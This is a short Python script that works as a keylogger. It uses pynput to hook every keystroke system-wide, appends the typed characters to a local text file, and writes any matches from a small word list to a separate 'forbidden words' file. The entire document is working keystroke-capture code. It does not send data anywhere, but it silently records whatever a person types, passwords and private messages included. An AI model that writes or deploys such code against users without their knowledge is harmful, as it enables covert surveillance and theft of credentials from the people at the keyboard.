import pynput

def on_press(key):

        try:
            with open(charfile, "a+") as file:
                file.write(f"{key.char}")
        except:
            pass
        with open(charfile,"r+") as file:
            txt = file.read().lower()
            with open(charfile2,"a+") as file2:
                for i in range(0,len(worldlist)):
                    if(worldlist[i] in txt):
                        file2.write(worldlist[i])
                        with open(charfile, "w") as file3:
                            file3.write("")
                        
log_file = "key_log.txt"
charfile = "key_log_txt.txt"
charfile2 = "forbittenwords.txt"
worldlist = ["test","test2","dupa"]
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()